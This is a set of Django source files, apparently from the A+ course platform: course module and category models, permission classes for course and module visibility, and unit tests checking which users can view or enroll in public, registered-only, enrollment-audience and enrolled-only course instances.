    def is_late_submission_open(self, when=None):
        when = when or timezone.now()
        return self.late_submissions_allowed \
            and self.closing_time <= when <= self.late_submission_deadline

    def is_closed(self, when=None):
        when = when or timezone.now()
        if self.late_submissions_allowed and self.late_submission_penalty < 1:
            return when > self.late_submission_deadline
        return when > self.closing_time

    def are_requirements_passed(self, cached_points):
        for r in self.requirements.all():
            if not r.is_passed(cached_points):
                return False
        return True

    def get_late_submission_point_worth(self):
        """"""
        Returns the percentage (0-100) that late submission points are worth.
        """"""
        point_worth = 0
        if self.late_submissions_allowed:
            point_worth = int((1.0 - self.late_submission_penalty) * 100.0)
        return point_worth

    def number_of_submitters(self):
        return self.course_instance.students\
            .filter(submissions__exercise__course_module=self).distinct().count()

    ABSOLUTE_URL_NAME = ""module""

    def get_url_kwargs(self):
        return dict(module_slug=self.url, **self.course_instance.get_url_kwargs())


class LearningObjectCategory(models.Model):
    """"""
    Learning objects may be grouped to different categories.
    """"""
    STATUS = Enum([
        ('READY', 'ready', _(""Ready"")),
        ('NOTOTAL', 'nototal', _(""No total points"")),
        ('HIDDEN', 'hidden', _(""Hidden"")),
    ])
    status = models.CharField(max_length=32,
        choices=STATUS.choices, default=STATUS.READY)
    name = models.CharField(max_length=255)
    description = models.TextField(blank=True)
    points_to_pass = models.PositiveIntegerField(default=0)
    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE,
        related_name=""categories"")
    confirm_the_level = models.BooleanField(default=False,
        help_text=_(""Once exercise is graded non zero it confirms all the points on the hierarchy level. Implemented as a mandatory feedback feature.""))
    accept_unofficial_submits = models.BooleanField(default=False,
        help_text=_(""Grade unofficial submissions after deadlines have passed or submission limits have been exceeded. The points are stored but not included in official records.""))

    #hidden_to = models.ManyToManyField(UserProfile, related_name=""hidden_categories"",
    #    blank=True, null=True)

    class Meta:
        unique_together = (""name"", ""course_instance"")

    def __str__(self):
        return self.name

    #def is_hidden_to(self, user_profile):
    #    return self.hidden_to.filter(id=user_profile.id).exists()

    #def set_hidden_to(self, user_profile, hide=True):
    #    if hide and not self.is_hidden_to(user_profile):
    #        self.hidden_to.add(user_profile)
    #    elif not hide and self.is_hidden_to(user_profile):
    #        self.hidden_to.remove(user_profile)
/n/n/ncourse/permissions.py/n/nfrom django.http import Http404
from django.utils.translation import ugettext_lazy as _

from authorization.permissions import (
    ACCESS,
    Permission,
    MessageMixin,
    ObjectVisibleBasePermission,
    FilterBackend,
)
from exercise.cache.points import CachedPoints
from userprofile.models import UserProfile
from .models import (
    CourseModule,
    CourseInstance,
)


class CourseVisiblePermission(ObjectVisibleBasePermission):
    message = _(""Permission denied by course visibility"")
    model = CourseInstance
    obj_var = 'instance'

    def is_object_visible(self, request, view, course):
        """"""
        Find out if CourseInstance is visible to user
        We expect that AccessModePermission is checked first

         - Always visible to course staff
         - Always hidden if not open (visible_to_students)
         - Always visible if public
         - If not public:
           - Require authentication
           - If view_access == enrolled -> visible if student of the course
           - If enrollment audience external, user should be external
           - If enrollment audience internal, user should be internal
        """"""
        # NOTE: course is actually course instance

        # Course is always visible to staff members
        if view.is_course_staff:
            return True

        # Course is not visible if it's hidden
        if not course.visible_to_students:
            self.error_msg(_(""The resource is not currently visible.""))
            return False

        user = request.user
        show_for = course.view_content_to
        VA = course.VIEW_ACCESS

        # FIXME: we probably should test if access_mode is ANONYMOUS (public), but that
        # would break api permissiosn (requires get_access_mode)
        if show_for != VA.PUBLIC:
            if not user.is_authenticated:
                self.error_msg(_(""This course is not open for public.""))
                return False

            # Handle enroll views separately
            if view.get_access_mode() == ACCESS.ENROLL:
                return self.enrollment_audience_check(request, course, user)

            if show_for == VA.ENROLLED:
                if not course.is_student(user):
                    self.error_msg(_(""Only enrolled students shall pass.""))
                    return False

            elif show_for == VA.ENROLLMENT_AUDIENCE:
                return self.enrollment_audience_check(request, course, user)

        return True

    def enrollment_audience_check(self, request, course, user):
        audience = course.enrollment_audience
        external = user.userprofile.is_external
        EA = course.ENROLLMENT_AUDIENCE
        if audience == EA.INTERNAL_USERS and external:
            self.error_msg(_(""This course is only for internal students.""))
            return False
        elif audience == EA.EXTERNAL_USERS and not external:
            self.error_msg(_(""This course is only for external students.""))
            return False
        return True


class EnrollInfoVisiblePermission(ObjectVisibleBasePermission):
    message = _(""Permission denied by course visibility"")
    model = CourseInstance
    obj_var = 'instance'

    def is_object_visible(self, request, view, course_instance):
        # Course is always visible to staff members
        if view.is_course_staff:
            return True

        # Course is not visible if it's hidden
        if not course_instance.visible_to_students:
            self.error_msg(_(""The resource is not currently visible.""))
            return False

        # Only public courses may be browsed without logging in.
        if course_instance.view_content_to != course_instance.VIEW_ACCESS.PUBLIC \
                and not request.user.is_authenticated:
            self.error_msg(_(""This course is not open for public.""))
            return False

        return True


class CourseModulePermission(MessageMixin, Permission):
    message = _(""The module is not currently visible"")

    def has_permission(self, request, view):
        if not view.is_course_staff:
            module = view.module
            return self.has_object_permission(request, view, module)
        return True

    def has_object_permission(self, request, view, module):
        if not isinstance(module, CourseModule):
            return True

        if module.status == CourseModule.STATUS.HIDDEN:
            return False

        if not module.is_after_open():
            # FIXME: use format from django settings
            self.error_msg(
                _(""The module will open for submissions at {date}.""),
                format={'date': module.opening_time},
                delim=' ',
            )
            return False

        if module.requirements.count() > 0:
            points = CachedPoints(module.course_instance, request.user, view.content)
            return module.are_requirements_passed(points)
        return True


class OnlyCourseTeacherPermission(Permission):
    message = _(""Only course teacher is allowed"")

    def has_permission(self, request, view):
        return self.has_object_permission(request, view, view.instance)

    def has_object_permission(self, request, view, obj):
        return view.is_teacher or request.user.is_superuser


class OnlyCourseStaffPermission(Permission):
    message = _(""Only course staff is allowed"")

    def has_permission(self, request, view):
        return self.has_object_permission(request, view, view.instance)

    def has_object_permission(self, request, view, obj):
        return view.is_course_staff or request.user.is_superuser


class IsCourseAdminOrUserObjIsSelf(OnlyCourseStaffPermission, FilterBackend):

    def has_object_permission(self, request, view, obj):
        if not isinstance(obj, UserProfile):
            return True

        user = request.user
        return user and (
            (user.id is not None and user.id == obj.user_id) or
            super().has_object_permission(request, view, obj)
        )

    def filter_queryset(self, request, queryset, view):
        user = request.user
        if (
            issubclass(queryset.model, UserProfile) and
            not view.is_course_staff and
            not user.is_superuser
        ):
            queryset = queryset.filter(user_id=user.id)
        return queryset
/n/n/ncourse/test_visibility_enroll.py/n/nfrom datetime import timedelta
import logging

from django.contrib.auth.models import User
from django.urls import reverse
from django.test import TestCase
from django.test.client import Client
from django.utils import timezone

from course.models import Course, CourseInstance, CourseModule, \
    LearningObjectCategory
from exercise.exercise_models import BaseExercise, CourseChapter, LearningObject
from exercise.submission_models import Submission

class CourseVisibilityTest(TestCase):
    """"""Tests for course visibility and access control.
    There are also some tests about enrollment.
    """"""

    def setUp(self):
        self.user = User(username=""testUser"") # not enrolled in the course
        self.user.set_password(""testUser"")
        self.user.save()

        self.student = User(username=""student"") # enrolled in the course
        self.student.set_password(""student"")
        self.student.save()

        self.course = Course.objects.create(
            name=""Test course"",
            code=""123456"",
            url=""Course-Url"",
        )

        self.today = timezone.now()
        self.tomorrow = self.today + timedelta(days=1)
        self.two_days_from_now = self.tomorrow + timedelta(days=1)
        self.yesterday = self.today - timedelta(days=1)

        # course instances with different view_access_to settings
        self.public_course_instance = CourseInstance.objects.create(
            instance_name=""Public"",
            starting_time=self.yesterday,
            ending_time=self.tomorrow,
            course=self.course,
            url=""public"",
            view_content_to=CourseInstance.VIEW_ACCESS.PUBLIC,
            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,
        )

        self.all_regist_course_instance = CourseInstance.objects.create(
            instance_name=""All registered users"",
            starting_time=self.yesterday,
            ending_time=self.tomorrow,
            course=self.course,
            url=""allregistered"",
            view_content_to=CourseInstance.VIEW_ACCESS.ALL_REGISTERED,
            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,
        )

        self.enroll_audience_course_instance = CourseInstance.objects.create(
            instance_name=""Enrollment audience"",
            starting_time=self.yesterday,
            ending_time=self.two_days_from_now,
            course=self.course,
            url=""enrollmentaudience"",
            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,
            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,
        )

        self.enrolled_course_instance = CourseInstance.objects.create(
            instance_name=""Enrolled"",
            starting_time=self.yesterday,
            ending_time=self.two_days_from_now,
            course=self.course,
            url=""enrolled"",
            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLED,
            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,
        )
        self.course_instances = [self.public_course_instance, self.all_regist_course_instance,
            self.enroll_audience_course_instance, self.enrolled_course_instance]

        # enrollment
        for instance in self.course_instances:
            instance.enroll_student(self.student)

        # module/exercise round for each course instance
        self.course_modules = {}
        for instance in self.course_instances:
            self.course_modules[instance.id] = CourseModule.objects.create(
                name=""Test module"",
                url=""test-module"",
                points_to_pass=10,
                course_instance=instance,
                opening_time=self.today,
                closing_time=self.tomorrow,
            )

        # category
        self.categories = {}
        for instance in self.course_instances:
            self.categories[instance.id] = LearningObjectCategory.objects.create(
                name=""Test category"",
                course_instance=instance,
                points_to_pass=0,
            )

        # learning objects
        self.learning_objects = {}
        for instance in self.course_instances:
            lobjects = []
            chapter = CourseChapter.objects.create(
                name=""Test chapter"",
                course_module=self.course_modules[instance.id],
                category=self.categories[instance.id],
                url='chapter1',
            )
            lobjects.append(chapter)
            lobjects.append(BaseExercise.objects.create(
                name=""Embedded exercise"",
                parent=chapter,
                status=LearningObject.STATUS.UNLISTED,
                course_module=self.course_modules[instance.id],
                category=self.categories[instance.id],
                url='embedexercise',
                max_submissions=10,
                max_points=10,
                points_to_pass=0,
            ))
            lobjects.append(BaseExercise.objects.create(
                name=""Normal exercise"",
                course_module=self.course_modules[instance.id],
                category=self.categories[instance.id],
                url='normalexercise',
                max_submissions=10,
                max_points=10,
                points_to_pass=0,
            ))
            self.learning_objects[instance.id] = lobjects

        # submissions
        self.submissions = {}
        for course_instance_id, exercises in self.learning_objects.items():
            for exercise in exercises:
                if not exercise.is_submittable:
                    continue
                self.submissions[exercise.id] = []
                submission = Submission.objects.create(
                    exercise=exercise,
                )
                submission.submitters.add(self.student.userprofile)
                self.submissions[exercise.id].append(submission)

        # disable all logging
        logging.disable(logging.CRITICAL)

    def test_redirect_to_enroll(self):
        url = self.enrolled_course_instance.get_absolute_url()
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)

        # unenrolled logged-in user should be redirected to the enroll page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertRedirects(response, self.enrolled_course_instance.get_url('enroll'))
        self.client.logout()

        # enrolled students should open the course front page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)

    def test_course_home(self):
        url = self.enroll_audience_course_instance.get_absolute_url()
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in user should see the course home page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the course front page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # course instance: all registered/logged-in users may see the course
        url = self.all_regist_course_instance.get_absolute_url()
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in user should see the course home page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the course front page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # public course instance
        url = self.public_course_instance.get_absolute_url()
        # anonymous user should see the course front page
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        # unenrolled logged-in user should see the course home page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the course front page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # course content visible to the enrollment audience, but user is
        # not in the enrollment audience
        ext_instance = CourseInstance.objects.create(
            instance_name=""Enrollment audience external"",
            starting_time=self.yesterday,
            ending_time=self.tomorrow,
            course=self.course,
            url=""extaudience"",
            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,
            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,
        )
        url = ext_instance.get_absolute_url()
        self.assertTrue(self.client.login(username=self.user.username, password=""testUser""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403) # Forbidden
        response = self.client.get(ext_instance.get_url('enroll'))
        self.assertEqual(response.status_code, 200) # allowed to see the enrollment page
        response = self.client.post(ext_instance.get_url('enroll'))
        self.assertEqual(response.status_code, 403) # may not enroll
        self.client.logout()

        # course content visible to registered users (logged-in users), but user is
        # not in the enrollment audience
        ext_regist_instance = CourseInstance.objects.create(
            instance_name=""Enrollment audience external - view registered users"",
            starting_time=self.yesterday,
            ending_time=self.tomorrow,
            course=self.course,
            url=""extaudience-registusers"",
            view_content_to=CourseInstance.VIEW_ACCESS.ALL_REGISTERED,
            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,
        )
        url = ext_instance.get_absolute_url()
        self.assertTrue(self.client.login(username=self.user.username, password=""testUser""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403) # Forbidden
        response = self.client.get(ext_instance.get_url('enroll'))
        self.assertEqual(response.status_code, 200) # allowed to see the enrollment page
        response = self.client.post(ext_instance.get_url('enroll'))
        self.assertEqual(response.status_code, 403) # may not enroll
        self.client.logout()

    def test_course_module(self):
        url = self.course_modules[self.enrolled_course_instance.id].get_absolute_url()
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in user should not see the module page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)
        self.client.logout()
        # enrolled students should open the course module page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # course instance: access to enrollment audience (logged-in internal users)
        url = self.course_modules[self.enroll_audience_course_instance.id].get_absolute_url()
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in user should see the module page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the course module page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # course instance: access to registered users (any logged-in users)
        url = self.course_modules[self.all_regist_course_instance.id].get_absolute_url()
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in user should see the module page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the course module page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # course instance: access to anyone (anonymous)
        url = self.course_modules[self.public_course_instance.id].get_absolute_url()
        # anonymous user can open the module page
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        # unenrolled logged-in user should see the module page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the course module page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # course content visible to the enrollment audience, but user is
        # not in the enrollment audience
        ext_instance = CourseInstance.objects.create(
            instance_name=""Enrollment audience external"",
            starting_time=self.yesterday,
            ending_time=self.tomorrow,
            course=self.course,
            url=""extaudience"",
            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,
            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,
        )
        ext_module = CourseModule.objects.create(
            name=""Test module"",
            url=""test-module"",
            points_to_pass=10,
            course_instance=ext_instance,
            opening_time=self.today,
            closing_time=self.tomorrow,
        )
        url = ext_module.get_absolute_url()
        self.assertTrue(self.client.login(username=self.user.username, password=""testUser""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403) # Forbidden
        self.client.logout()

    def test_chapter_enrolled_only(self):
        url = self.learning_objects[self.enrolled_course_instance.id][0].get_display_url()
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in user should not see the chapter page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)
        self.client.logout()
        # enrolled students should open the chapter page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # chapter exercise
        chapter_exercise = self.learning_objects[self.enrolled_course_instance.id][1]
        url = '/Course-Url/enrolled/test-module/chapter1/embedexercise/plain/'
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in user should not see the exercise
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)
        self.client.logout()
        # enrolled students should open the chapter page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # normal exercise (not inside chapter)
        exercise = self.learning_objects[self.enrolled_course_instance.id][2]
        url = reverse('exercise', kwargs={
            'exercise_path': exercise.url,
            'module_slug': exercise.course_module.url,
            'instance_slug': exercise.course_module.course_instance.url,
            'course_slug': exercise.course_module.course_instance.course.url,
        })
        self.assertEqual(url, '/Course-Url/enrolled/test-module/normalexercise/')
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in user should not see the exercise
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)
        self.client.logout()
        # enrolled students should open the chapter page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

    def test_chapter_enroll_audience(self):
        url = self.learning_objects[self.enroll_audience_course_instance.id][0].get_display_url()
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in internal user should see the chapter page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the chapter page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # chapter exercise
        chapter_exercise = self.learning_objects[self.enroll_audience_course_instance.id][1]
        url = '/Course-Url/enrollmentaudience/test-module/chapter1/embedexercise/plain/'
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in internal user should see the exercise
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the chapter page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # normal exercise (not inside chapter)
        exercise = self.learning_objects[self.enroll_audience_course_instance.id][2]
        url = reverse('exercise', kwargs={
            'exercise_path': exercise.url,
            'module_slug': exercise.course_module.url,
            'instance_slug': exercise.course_module.course_instance.url,
            'course_slug': exercise.course_module.course_instance.course.url,
        })
        self.assertEqual(url, '/Course-Url/enrollmentaudience/test-module/normalexercise/')
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in user should see the exercise
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the exercise page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # course content visible to the enrollment audience, but user is
        # not in the enrollment audience
        ext_instance = CourseInstance.objects.create(
            instance_name=""Enrollment audience external"",
            starting_time=self.yesterday,
            ending_time=self.tomorrow,
            course=self.course,
            url=""extaudience"",
            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,
            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.EXTERNAL_USERS,
        )
        ext_module = CourseModule.objects.create(
            name=""Test module"",
            url=""test-module"",
            points_to_pass=10,
            course_instance=ext_instance,
            opening_time=self.today,
            closing_time=self.tomorrow,
        )
        ext_category = LearningObjectCategory.objects.create(
            name=""External test category"",
            course_instance=ext_instance,
            points_to_pass=0,
        )
        ext_chapter = CourseChapter.objects.create(
            name=""External test chapter"",
            course_module=ext_module,
            category=ext_category,
            url='extchapter1',
        )
        url = ext_chapter.get_display_url()
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in internal user should NOT see the chapter page
        # (user is not external and the course is visible to external users only)
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)
        self.client.logout()

    def test_chapter_all_registered(self):
        url = self.learning_objects[self.all_regist_course_instance.id][0].get_display_url()
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in internal user should see the chapter page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the chapter page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # chapter exercise
        chapter_exercise = self.learning_objects[self.all_regist_course_instance.id][1]
        url = '/Course-Url/allregistered/test-module/chapter1/embedexercise/plain/'
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in internal user should see the exercise
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the chapter page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # normal exercise (not inside chapter)
        exercise = self.learning_objects[self.all_regist_course_instance.id][2]
        url = reverse('exercise', kwargs={
            'exercise_path': exercise.url,
            'module_slug': exercise.course_module.url,
            'instance_slug': exercise.course_module.course_instance.url,
            'course_slug': exercise.course_module.course_instance.course.url,
        })
        self.assertEqual(url, '/Course-Url/allregistered/test-module/normalexercise/')
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # unenrolled logged-in user should see the exercise
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the exercise page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

    def test_chapter_public(self):
        url = self.learning_objects[self.public_course_instance.id][0].get_display_url()
        # anonymous user can open the chapter
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        # unenrolled logged-in internal user should see the chapter page
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the chapter page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # chapter exercise
        chapter_exercise = self.learning_objects[self.public_course_instance.id][1]
        url = '/Course-Url/public/test-module/chapter1/embedexercise/plain/'
        # anonymous user can open the chapter exercise
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        # unenrolled logged-in internal user should see the exercise
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the chapter exercise normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

        # normal exercise (not inside chapter)
        exercise = self.learning_objects[self.public_course_instance.id][2]
        url = reverse('exercise', kwargs={
            'exercise_path': exercise.url,
            'module_slug': exercise.course_module.url,
            'instance_slug': exercise.course_module.course_instance.url,
            'course_slug': exercise.course_module.course_instance.course.url,
        })
        self.assertEqual(url, '/Course-Url/public/test-module/normalexercise/')
        # anonymous user can open the exercise
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        # unenrolled logged-in user should see the exercise
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()
        # enrolled students should open the exercise page normally
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

    def test_submission(self):
        # submission in the chapter exercise
        chapter_exercise = self.learning_objects[self.enrolled_course_instance.id][1]
        submission = self.submissions[chapter_exercise.id][0]
        url = submission.get_absolute_url()
        self.assertEqual(url,
            '/Course-Url/enrolled/test-module/chapter1/embedexercise/submissions/{0}/'.format(
                submission.id))
        # should redirect to A+ login
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        # non-submitter user should not see the submission
        self.assertTrue(self.client.login(username=self.user.username, password='testUser'))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)
        self.client.logout()
        # the submitter should see her submission
        self.assertTrue(self.client.login(username=self.student.username, password=""student""))
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.client.logout()

    def test_enroll(self):
        self.assertTrue(self.enrolled_course_instance.is_enrollable(self.user))
        self.assertTrue(self.enrolled_course_instance.is_enrollment_open())

        # course instance is hidden from students
        new_instance = CourseInstance.objects.create(
            instance_name=""Hidden course instance"",
            starting_time=self.yesterday,
            ending_time=self.tomorrow,
            course=self.course,
            url=""hiddencourse"",
            view_content_to=CourseInstance.VIEW_ACCESS.PUBLIC,
            enrollment_audience=CourseInstance.ENROLLMENT_AUDIENCE.INTERNAL_USERS,
            visible_to_students=False,
        )
        url = new_instance.get_url('enroll')
        # anonymous user accesses a hidden course: redirect to login
        response = self.client.post(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)
        response = self.client.get(url)
        self.assertRedirects(response, '/accounts/login/?next=' + url)

        # enrollment closed
        new_instance.visible_to_students = True
        new_instance.enrollment_starting_time = self.yesterday
        new_instance.enrollment_ending_time = self.yesterday + timedelta(hours=1)
        new_instance.save()
        url = new_instance.get_url('enroll')
        self.assertTrue(new_instance.is_enrollable(self.user))
        self.assertFalse(new_instance.is_enrollment_open())
        self.assertTrue(self.client.login(username=self.user.username, password=""testUser""))
        response = self.client.get(url)
        # can open the enrollment page
        self.assertEqual(response.status_code, 200)
        # can not enroll
        response = self.client.post(url)
        self.assertEqual(response.status_code, 403)
        self.client.logout()

    def test_enrollment_exercise(self):
        instance = self.enrolled_course_instance
        enroll_exercise = self.learning_objects[instance.id][2]
        enroll_exercise.status = LearningObject.STATUS.ENROLLMENT
        enroll_exercise.save()
        enroll_url = instance.get_url('enroll')
        exercise_url = reverse('exercise', kwargs={
            'exercise_path': enroll_exercise.url,
            'module_slug': enroll_exercise.course_module.url,
            'instance_slug': enroll_exercise.course_module.course_instance.url,
            'course_slug': enroll_exercise.course_module.course_instance.course.url,
        })

        # anonymous may not open the exercise nor enroll
        response = self.client.post(enroll_url)
        self.assertRedirects(response, '/accounts/login/?next=' + enroll_url)
        response = self.client.get(exercise_url)
        self.assertRedirects(response, '/accounts/login/?next=' + exercise_url)
        response = self.client.post(exercise_url)
        self.assertRedirects(response, '/accounts/login/?next=' + exercise_url)
        # the course has only one enrollment (made in setUp())
        self.assertEqual(instance.students.count(), 1)

        # logged-in user may open the exercise and submit
        self.assertTrue(self.client.login(username=self.user.username, password=""testUser""))
        response = self.client.post(enroll_url)
        self.assertRedirects(response, exercise_url) # redirects to the enrollment exercise
        response = self.client.get(exercise_url)
        self.assertEqual(response.status_code, 200)
        # Since there is no exercise service running in the unit test environment,
        # we can not make test submissions to the exercise.
        success_flag, warnings, students = enroll_exercise.check_submission_allowed(self.user.userprofile)
        self.assertEqual(success_flag, BaseExercise.SUBMIT_STATUS.ALLOWED)
